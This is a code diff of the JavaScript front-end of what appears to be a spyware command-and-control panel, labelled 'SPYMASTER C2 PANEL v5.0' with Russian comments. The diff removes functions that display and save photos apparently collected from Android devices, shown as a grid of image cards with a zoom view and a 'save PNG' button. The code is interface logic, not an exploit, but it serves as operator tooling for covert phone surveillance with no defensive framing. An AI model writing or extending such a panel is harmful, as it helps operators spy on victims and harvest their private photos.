@@ -1456,70 +1456,7 @@ async function clearAllFiles() {
         }
     } catch (error) { addLog(`❌ Ошибка: ${error.message}`, "error", false); }
 }
-// ============= СОХРАНЕНИЕ ФОТО КАК PNG =============
-function savePhotoAsPNG(base64Data, filename) {
-    // Создаём ссылку для скачивания
-    const link = document.createElement('a');
-    link.href = `data:image/png;base64,${base64Data}`;
-    link.download = filename.replace('.txt', '.png');
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-    showNotification(`✅ Фото сохранено: ${link.download}`, "success");
-}
 
-// Обновлённая функция displayPhoto с кнопкой сохранения
-function displayPhoto(base64Data, filename) {
-    const grid = document.getElementById("androidPhotosGrid");
-    if (!grid) return;
-    
-    if (!base64Data || base64Data.length < 100) return;
-    
-    const card = document.createElement("div");
-    card.className = "screenshot-card";
-    card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:10px;overflow:hidden;background:#0a0e27;transition:transform 0.2s;margin-bottom:15px";
-    
-    const img = document.createElement("img");
-    img.src = `data:image/png;base64,${base64Data}`;
-    img.style.cssText = "width:100%;height:150px;object-fit:cover;background:#0a0e27";
-    
-    // Клик по картинке - увеличение
-    img.onclick = () => {
-        const modal = document.createElement("div");
-        modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;display:flex;justify-content:center;align-items:center;cursor:pointer";
-        const modalImg = document.createElement("img");
-        modalImg.src = `data:image/png;base64,${base64Data}`;
-        modalImg.style.cssText = "max-width:90%;max-height:90%;border:2px solid #00ff41;border-radius:10px";
-        modal.appendChild(modalImg);
-        modal.onclick = () => modal.remove();
-        document.body.appendChild(modal);
-    };
-    
-    const info = document.createElement("div");
-    info.style.cssText = "padding:10px;font-size:11px;text-align:center;background:#0a0e27";
-    info.innerHTML = `
-        <div style="margin-bottom:5px">📸 ${filename}</div>
-        <button class="save-photo-btn" style="background:#00ff41;color:#0a0e27;border:none;padding:5px 10px;border-radius:5px;cursor:pointer;font-family:monospace;font-weight:bold">💾 СОХРАНИТЬ PNG</button>
-    `;
-    
-    const saveBtn = info.querySelector('.save-photo-btn');
-    saveBtn.onclick = (e) => {
-        e.stopPropagation();
-        savePhotoAsPNG(base64Data, filename);
-    };
-    
-    card.appendChild(img);
-    card.appendChild(info);
-    
-    if (grid.children.length === 1 && grid.children[0].classList && grid.children[0].classList.contains("empty-message")) {
-        grid.innerHTML = "";
-    }
-    grid.insertBefore(card, grid.firstChild);
-    
-    while (grid.children.length > 20) {
-        grid.removeChild(grid.lastChild);
-    }
-}
 // ============= ИНИЦИАЛИЗАЦИЯ =============
 function init() {
     addLog("🐀 SPYMASTER C2 PANEL v5.0 ЗАПУЩЕН", "system", false);
